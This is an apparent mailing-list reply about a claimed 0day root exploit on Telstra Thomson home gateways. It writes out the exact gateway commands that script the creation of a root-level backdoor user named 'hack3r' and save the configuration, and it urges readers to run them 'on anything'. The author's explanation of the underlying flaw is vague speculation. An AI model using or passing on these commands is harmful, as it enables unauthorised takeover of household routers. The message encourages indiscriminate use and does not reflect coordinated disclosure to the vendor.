Subject: Re: Telstra thompson gateway - root exploit (0day)

Hello Jeremy,
i would suggest looking up T-Hub ,also this is Telstras new system wich is
basically a little box that sits in your house and you can control alot
through this system,I am not to sure if it affects this and I also noticed
that the characters needed were stripped in the first posting so it showed
wrong.
It should have been written as:

:script add name addroot command "user add name hack3r password hack3r role
root descr ROOT"
:script run name addroot pars ""
:saveall

this would then add 'hack3r' to the gateway with role of root
user/administrator.
The vendor is also partnered to Bigpond and this is a huge system,I guess
this is more of a flaw in how it handles input and parses the add name
function ,I assume the code is not passing input after the :script add ,is
called,i have seen many small similar flaws like this in commandline apps,
it is always buffers or strings not secured properly or not setup and
structured in a secure manner.
I will have some tests ran and see what happens, please use this updated
script code to run on anything,
I am also not too sure how to go about trying to contact and show this to
such a large firm, specially with the stuff happening here lately.
cheers
